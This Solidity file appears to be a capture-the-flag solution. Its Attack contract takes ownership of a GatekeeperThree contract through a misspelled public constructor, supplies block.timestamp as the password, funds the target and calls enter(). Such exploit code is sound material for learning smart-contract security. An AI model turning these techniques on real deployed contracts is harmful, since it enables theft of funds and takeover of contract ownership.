interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

// 0x5F495186De8b5A6E6AB1fB7B5D1e96F68b1347Fa

contract Attack {
    IGatekeeperThree target;

    constructor(address targetAddr) payable {
        target = IGatekeeperThree(targetAddr);
    }

    function attack() public {
        target.construct0r();

        target.createTrick();
        target.getAllowance(block.timestamp);

        (bool success, ) = payable(address(target)).call{value: address(this).balance}("");
        require(success, "call failed");

        target.enter();
    }
}
